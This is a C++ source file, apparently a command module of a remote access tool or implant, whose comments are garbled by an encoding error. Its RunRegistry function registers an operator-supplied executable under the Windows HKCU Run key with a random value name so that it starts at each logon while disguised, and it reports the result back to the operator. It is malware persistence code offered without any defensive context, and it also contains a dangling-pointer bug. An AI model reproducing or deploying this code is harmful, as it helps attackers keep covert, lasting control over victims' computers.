// ���������J�j�Y���̃R�}���h
#include "Persistence.h"



// Run���W�X�g���L�[�Ŏ��������J�j�Y��
void RunRegistry(std::vector<std::string>& tokens) {

    // �R���s���[�^�[\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    HKEY hKey;
    LPCWSTR subkey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";

    // �t�@�C�������w�肳��Ă��Ȃ��ꍇ�̓G���[
    if (tokens.size() < 2) {
        SendString("[-] ���s�t�@�C�������w�肳��Ă��܂���");
        return;
    }

    std::string fileName = tokens[1];

    // �t�@�C���������C�h������ɕϊ�
    wchar_t exePath[MAX_PATH];
    mbstowcs(exePath, fileName.c_str(), MAX_PATH);

    // ���s�\�t�@�C�����w�肳�ꂽ�p�X�ɑ��݂��邩�m�F
    DWORD fileAttr = GetFileAttributesW(exePath);
    if (fileAttr == INVALID_FILE_ATTRIBUTES) {
        SendString("[-] �w�肳�ꂽ�t�@�C�������݂��܂���");
        return;
    }

    // ���W�X�g���L�[���J��
    LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, subkey, 0, KEY_SET_VALUE, &hKey);
    if (result != ERROR_SUCCESS) {
        SendString("[-] ���W�X�g���L�[�̃I�[�v���Ɏ��s���܂���");
        return;
    }

    // �����_���ȕ�����𐶐����ă��W�X�g���̒l���Ƃ��Ďg�p
    std::string randomValueName = generateRandomFileName();

    // �t�@�C���p�X�����W�X�g���ɃZ�b�g
    LPCWSTR valueName = std::wstring(randomValueName.begin(), randomValueName.end()).c_str();
    result = RegSetValueEx(hKey, valueName, 0, REG_SZ, (const BYTE*)exePath, (wcslen(exePath) + 1) * sizeof(wchar_t));

    if (result == ERROR_SUCCESS) {
        SendString("[+] ���W�X�g���Ɏ��s�t�@�C����o�^���܂���");
    }
    else {
        SendString("[-] ���W�X�g���l�̐ݒ�Ɏ��s���܂���");
    }

    // ���W�X�g���L�[�����
    RegCloseKey(hKey);
}
